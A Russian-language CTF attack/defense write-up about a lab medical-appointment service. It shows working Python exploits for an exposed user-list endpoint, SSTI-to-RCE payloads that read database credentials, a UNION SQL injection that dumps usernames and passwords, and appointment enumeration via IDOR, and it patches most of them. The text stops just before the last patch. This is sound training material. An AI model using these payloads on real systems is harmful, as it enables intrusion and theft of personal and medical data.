# Летняя Школа CTF (30.07.2023 - 10.08.2023) Attack/Defense

## Service 1: smc

### Описание сервиса
Сервис предназначен для управления записями к врачами среди зарегистрированных на платформе пациентов. При развертывании сервиса средствами Docker Compose появляется два компонента:
1. Сам сервис (Frontend + Backend), доступный на порте 1337;
2. База Данных PostgreSQL, не имеющая открытого порта для прямого подключения.

![ScreenShot](screenshots/1.png)

### Vuln 1: Получение списка пользователей через /api-dev/users

Для дальнейших тестов зарегистрируем несколько пользователей:

![ScreenShot](screenshots/2.png)

Регистрируем таким образом 3 пользователя. Теперь, самое интересное, что всех зарегистрированных пользователей можно посмотреть даже **не проходя процедуру авторизации**. Нужно всего лишь перейти по пути **/api-dev/users**:

![ScreenShot](screenshots/3.png)

Напишем небольшой эксплойт:

```python
import requests

url = "http://localhost:1337/api-dev/users"

response__users = requests.get(url)
print("[+]", response__users.status_code, response__users.text)
```

```sh
$#> python smc__api-dev-user.py

[+] 200 {"list":[[1,"John Smith"],[2,"Ryan Gosling"],[3,"Bill Adams"]]}
```

Теперь дело за патчем уязвимости. Находим часть кода, которая отвечает за данный route:

```python
# /smc/src/routes.py

@app.route('/api-dev/users', methods=['GET'])
def get_users():
    return {'list': db.get_all_users()}
```

А теперь просто берем и удаляем/комментируем данную часть кода и перезапускаем сервис:

![ScreenShot](screenshots/4.png)

Проверяем наш патч:

![ScreenShot](screenshots/5.png)

Как видим, доступ к пользователям через **/api-dev/users** закрыт, но есть еще один нюанс...


### Vuln 2: RCE via SSTI
Вы заметили, что в случае, если страница не существует, появляется страница **404**, но на ней же выводится директория, по которой мы пытаемся перейти. Наталкивает на SSTI:

```sh
http://localhost:1337/{{7*7}}
```

![ScreenShot](screenshots/6.png)

Вот мы и нашли возможность исполнения произвольного кода на сервере. Раскручиваем атаку. Для начала узнаем, под каким номером скрывается объект **Popen()**, который позволяет исполнять код:

```sh
http://127.0.0.1:1337/{{''.__class__.mro()[1].__subclasses__()[273]}}
```

![ScreenShot](screenshots/7.png)

Собственно, само исполнение кода на стороне сервера:

```sh
http://localhost:1337/{{''.__class__.mro()[1].__subclasses__()[273]('ls -la',shell=True,stdout=-1).communicate()[0].strip()}}
```

![ScreenShot](screenshots/8.png)

Напишем эксплойт, который посредством найденной уязвимости будет взаимодействовать с базой данных:

```python
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup


# Ссылка на сервис
url = "http://localhost:1337"

# Базовый payload, который возвращает данные для подключения к БД
payload__postgres_creds = '{{config.__class__.from_envvar.__globals__.__builtins__.__import__("os").environ.get("POSTGRES_CONNECT")}}'


# Функция, которая добавляет payload к url и возвращает результат
def triggering_ssti(url, payload):
    response = requests.get(url + "/" + payload)

    # Не забываем, что возможность исполнять код у нас появляется толькопри открытии страницы с 404 ошибкой
    if response.status_code == 404:
        return response.text
    else:
        return "[+] 200 | This path exists"


# Вызываем функцию с целью получения данных для входа.
html__page_with_creds = triggering_ssti(url=url, payload=payload__postgres_creds)


# Функция triggering_ssti() возвращает исходный html-код страницы, поэтому далее парсим сами данные, которые вернулись благодаря payload__postgres_creds
def creds_parser(page):
    soup = BeautifulSoup(page, "html.parser")

    # Выделяем строку с параметрами
    creds_string = soup.find_all("h1")[1].text.strip()[1:-len(" not found!")]

    # Парсинг отдельных данных
    string = urlparse(creds_string)

    # Выделяем данные из полученного ранее кортежа
    dbname = string.path[1:]
    user = string.username
    password = string.password
    host = string.hostname
    port = string.port

    return f'dbname={dbname} user={user} password={password} host={host} port={port}'


# Строка, которая необходима в дальнейшем для подклбчения
connection_string = creds_parser(page=html__page_with_creds)
#print(connection_string)


# Формируем главный payload

# Для начала активируем "курсор" для БД, который позволит нам исполнять SQL-запросы
cursor_payload = f'config.__class__.from_envvar.__globals__.__builtins__.__import__("psycopg2").connect("{connection_string}").cursor()'

# Затем, получаем данные из таблицы users
data = triggering_ssti(url=url, payload="{% set cursor = " + cursor_payload + " %}" + '{{ cursor.execute("SELECT * FROM users") or "" }}' + "{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('json').dumps(cursor.fetchall(), default=''.__class__) }}")

# Парсим получанные данные
soup = BeautifulSoup(data, "html.parser")
creds_string = soup.find_all("h1")[1].text.strip()[1:-len(" not found!")]

# Выводим наш результат
print(creds_string)
```

```sh
$#> python smc__ssti.py

[[1, "2023-08-12 14:15:04.059874", "Ryan Gosling", "asdfasdf", "RyanGosling@gmail.com"], [2, "2023-08-12 14:38:44.293652", "Jonh Peterson", "qwerty", "JonhPeterson@gmail.com"]]
```

Да, тут стоит отметить, что пользователи новые из-за перезапуска сервиса после внесения исправлений, тем не менее, суть от этого не меняется. Исправляем уязвимость. Все также находим уязвимую часть кода:

```python
# /smc/src/routes.py

@app.errorhandler(404)
def page_not_found(e):
    error_page = open('src/templates/404.html').read().replace('_PATH_', request.path)
    return render_template_string(error_page), 404
```

```html
# /smc/src/templates/404.html

<h1>
	_PATH_ not found!
</h1>
```

Исправленный вариант:

![ScreenShot](screenshots/9.png)

![ScreenShot](screenshots/10.png)

Проверяем наш патч:

```sh
http://localhost:1337/{{7*7}}
```

![ScreenShot](screenshots/11.png)


### Vuln 3: SQL Injection
Обратим внимание на следующий код:

```python
# /smc/src/sql.py

def get_doctor_by_name(self, docname):
    results = []
    with self.conn.cursor() as cursor:
        cursor.execute("SELECT * FROM doctors WHERE name = '%s'" % (docname, ))
        results = cursor.fetchall()
    if results == [] or results[0] == []:
        results = None
    return results


# /smc/src/routes.py

@app.route('/appointments/create', methods=['GET'])
def create_app():
    if 'logged' not in session or not session['logged']:
        return redirect(url_for('index'))
    return render_template('visitForm.html', doctors=json.dumps({'list': db.get_all_doctors()}))

@app.route('/appointments/create', methods=['POST'])
def create_app_post():
    if 'logged' not in session or not session['logged']:
        return redirect(url_for('index'))
    fio = request.form.get('fio')
    time = request.form.get('timeStamp')
    ins_num = request.form.get('insNum')
    doctor = request.form.get('doctor')
    app_id = db.create_appointment(session['user_id'], doctor, fio, ins_num, time)
    return redirect(url_for('info_app', appid=app_id))

@app.route('/appointments/<appid>/info', methods=['GET'])
def info_app(appid):
    if 'logged' not in session or not session['logged']:
        return redirect(url_for('index'))
    app_info = db.get_appointment_by_id(appid)[0]
    doctor = db.get_doctor_by_name(app_info[2])[0]
    return render_template('appointCurrent.html', appinfo=app_info, doctor=doctor)
```

В функции "get_doctor_by_name" при выполнении запроса к БД используется небезопасная операция форматирования (`%`). При использовании данного оператора в SQL-запрос поставляется значение переменной без какого-либо экранирования. Таким образом возникает уязвимость данной функции.

Проанализировав код, мы видим, что данная функция вызывается в API `GET /appointments/<appid>/info`. Чтобы достичь данной части кода необходимо предварительно записаться на прием к врачу, вызвав API `POST /appointments/create`, записав в поле `doctor` полезную нагрузку.

Руками такое точно реализовать не получится по причине того, что на front-end'е для поля `doctor` установлен список, из которого можно выбрать врача, поэтому пишем эксплойт, который нам поможет обойти выбор доктора из списка:

```python
import os
import requests
from bs4 import BeautifulSoup


# Функция для регистрации аккаунта
def register(session, url, username, password):
    res = session.post(
        url + "/register",
        data={
            "username": username,
            "personalData": f"{username}@gmail.com",
            "password": password,
            "passwordRep": password,
        },
        allow_redirects=False,
    )
    if res.status_code != 302:
        raise Exception("Failed to register user")
    if "err=" in res.headers["Location"]:
        raise Exception("Failed to register user")
    return True


# Функция для создания записи ко врачу
def create_appointment(session, url, doctor):
    res = session.post(
        url + "/appointments/create",
        data={
            "fio": "test",
            "timeStamp": "2023-01-09",
            "insNum": "test",
            "doctor": doctor,
        },
        allow_redirects=False,
    )
    return res.headers["Location"].split("/")[-2]


# Функция для получения информации о записи
def get_appointment(session, url, appointment_id):
    res = session.get(url + f"/appointments/{appointment_id}/info")
    if res.status_code != 200:
        print(res.text)
        raise Exception("Failed to get appointment")
    soup = BeautifulSoup(res.text, "html.parser")
    return [
        soup.find("div", {"class": "username"}).text.strip(),
        soup.find("div", {"class": "spec"}).text.strip()[len("specialization: ") :],
    ]


# Главная функция
def pwn(url):
    # Для начала формируем новые логин и пароль
    username = f"enigma-" + os.urandom(8).hex()
    password = os.urandom(16).hex()
    print(f"[*] Registering user {username}:{password}")

    # Делаем сессию и создаем аккаунт при помощи функции register()
    session = requests.Session()
    register(session, url, username, password)

    # Далее создаем запись ко врачу, но при этом используем необходимую нам нагрузку
    def sqli(payload):
        # Вызываем функцию create_appointment(), но передаем ей вместо реального доктора полезную нагрузку - аргумент payload
        appointment_id = create_appointment(session, url, payload)
        print(f"[*] Created appointment {appointment_id}")
        return get_appointment(session, url, appointment_id)


    # Вызываем функцию sqli(), которая поможет нам добраться до БД. В функцию передаем payload, который пойдет дальше в поле doctor
    results_usernames = sqli(
        "1' UNION SELECT 1, CAST(COUNT(*) as TEXT), string_agg(username, '\n') FROM users LIMIT 1 -- "
    )

    results_passwords = sqli(
        "1' UNION SELECT 1, CAST(COUNT(*) as TEXT), string_agg(password, '\n') FROM users LIMIT 1 -- "
    )

    # Вычисляем количество пользователей
    count = int(results_usernames[0])
    print(f"[*] Found {count} users")

    # Получаем логины и пароли
    data_usernames = results_usernames[1].split("\n")
    data_passwords = results_passwords[1].split("\n")

    creds_array = []

    for i in range(0, count):
        creds_array.append([data_usernames[i], data_passwords[i]])

    return creds_array


if __name__ == "__main__":
    print(pwn("http://localhost:1337"))
```

Результат работы эксплойта:

```sh
$#> python smc__sqli.py

[*] Registering user enigma-00d1ad42e3700b77:51f2d509838f57c0809a79f4d75c916a
[*] Created appointment 1
[*] Created appointment 2
[*] Found 2 users
[['Ryan Gosling', 'qwerty'], ['enigma-00d1ad42e3700b77', '51f2d509838f57c0809a79f4d75c916a']]
```

Почему создаются две записи на прием к врачу? Все просто - я вызываю функцию `sqli()` два раза. При этом в первый раз я получаю лонгины, а во второй пароли от этих самых логинов. Затем просто красиво выводим их попарно. Таким образом, м ы получаем доступ ко всем учетным записям. Попробуем это исправить:

![ScreenShot](screenshots/12.png)

В очередной раз билдим контейнер заново, чтобы изменения вступили в силу и проверям возможность использования SQLi:

```sh
$#> python smc__sqli.py

[*] Registering user enigma-49a8ddb0a026418b:8b16210fbff932f67c4832f08317d342
[*] Created appointment 1
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

Traceback (most recent call last):
  File "C:\Users\Ivan-\Desktop\LetoCTF AD 2023\exploits\smc__sqli.py", line 98, in <module>
    print(pwn("http://localhost:1337"))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\Ivan-\Desktop\LetoCTF AD 2023\exploits\smc__sqli.py", line 73, in pwn
    results_usernames = sqli(
                        ^^^^^
  File "C:\Users\Ivan-\Desktop\LetoCTF AD 2023\exploits\smc__sqli.py", line 69, in sqli
    return get_appointment(session, url, appointment_id)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\Ivan-\Desktop\LetoCTF AD 2023\exploits\smc__sqli.py", line 45, in get_appointment
    raise Exception("Failed to get appointment")
Exception: Failed to get appointment
```

Как видим, наш эксплойт перестал работать, но он все также создает пользователя и запись на прием, вот только делает ли он теперь это так, как нам необходимо? Проверим это в нашем созданном аккаунте:

![ScreenShot](screenshots/13.png)

Таким образом, нам удалось защитить сервис от SQLi


### Vuln 4: Appointments

На данный момент у нас на сервисе зарегистрированы 3 пользователя и у каждого из них есть по одной записи к разным специалистам. Сейчас мы авторизованы от имени **Bill Krimson**.

![ScreenShot](screenshots/14.png)

При этом, я могу смотреть не только свои записи к врачам, но и записи других пользователей к различным специалистам. Для этого необходимо перейти по пути `/appointments/<number_here>/info`, выбрав нужный номер. Например, посмотрим свою запись:

```sh
http://localhost:1337/appointments/3/info
```

![ScreenShot](screenshots/15.png)

А теперь чужую:

```sh
http://localhost:1337/appointments/1/info
```

![ScreenShot](screenshots/16.png)

Таким образом, стоит нам только пройти авторизацию через любого пользователя, и мы можем получить доступ ко всем записям. Представим, что у пользлвателя "Ryan Gosling" есть две записи к врачам. Напишем эксплой, который регистрирует пользователя в системе, затем проходит авторизацию и последовательно забирает все записи к врачам:

```python
import requests
from bs4 import BeautifulSoup
import random
import os
import sys


url = 'http://localhost:1337'


# Функция для регистрации аккаунта
def register(url, username, password):
    res = requests.post(
        url + "/register",
        data={
            "username": username,
            "personalData": f"{username}@gmail.com",
            "password": password,
            "passwordRep": password,
        },
        allow_redirects=False,
    )
    if res.status_code != 302:
        raise Exception("Failed to register user")
    if "err=" in res.headers["Location"]:
        raise Exception("Failed to register user")
    return True


# Функция для входа в аккаунт
def login(session, url, username, password):
	res = session.post(
		url + "/login",
		data={
			"login": username,
			"password": password,
		},
		allow_redirects=True,
	)
	if res.status_code == 200:
		return True
	else:
		raise Exception("Failed to login")
		return False


# Функция для получения информации о записи
def get_appointment(session, url, appointment_id):
    res = session.get(url + f"/appointments/{appointment_id}/info")
    if res.status_code != 200:
    	sys.exit()
    soup = BeautifulSoup(res.text, "html.parser")
    return [
    	soup.find("div", {"class": "dataAppoint"}).text.strip(),
        soup.find("div", {"class": "username"}).text.strip(),
        soup.find("div", {"class": "spec"}).text.strip()[len("specialization: ") :],
    ]


# Главная функиция эксплойта
def main__exploit(username, password):
	# Тут хотел бы обратить внимание на то, что сессия применяется только к функции login(), чтобы потом получать записи к врачам (appointments) через АВТОРИЗОВАННОГО пользователя

	# Сессия
	session = requests.Session()
	print("[+] Account was successfully registered", register(url, username, password), "-", f"{username}:{password}")
	print("[+] Login successful", login(session, url, username, password), "-", f"{username}:{password}")

	# Верхний порог цикла не стоит оставлять маленьким - может быть много записей. В любом случае, эксплойт остановится в случае, если код ответа будет отличен от "200"
	for i in range(1, 1000):
		print(f"[+] Appointment {i}", get_appointment(session, url, i))


if __name__ == "__main__":
	print(main__exploit(f"EnigmaHackers-{str(os.urandom(8).hex())}", f"{str(os.urandom(8).hex())}"))
```

Результат работы эксплойта:
```sh
$#> python smc__appointments.py

[+] Account was successfully registered True - EnigmaHackers-9f6748f3a3ed40e6:0b30e3a5c7285270
[+] Login successful True - EnigmaHackers-9f6748f3a3ed40e6:0b30e3a5c7285270
[+] Appointment 1 ['Date of appointment: 2023-10-25\n\n\n\n\n\n\n Client Name: Ryan Gosling\n\n\n\n\n\n\n Insurance Number: 3', 'Theresa J. Pesina', 'Pediatrics']
[+] Appointment 2 ['Date of appointment: 2023-12-14\n\n\n\n\n\n\n Client Name: Ryan Gosling\n\n\n\n\n\n\n Insurance Number: 4', 'Timothy T. Fox', 'Urology']
```

Таким обазом, мы получаем все записи, что есть в системе на данный момент. Патч выглядит следующим образом:



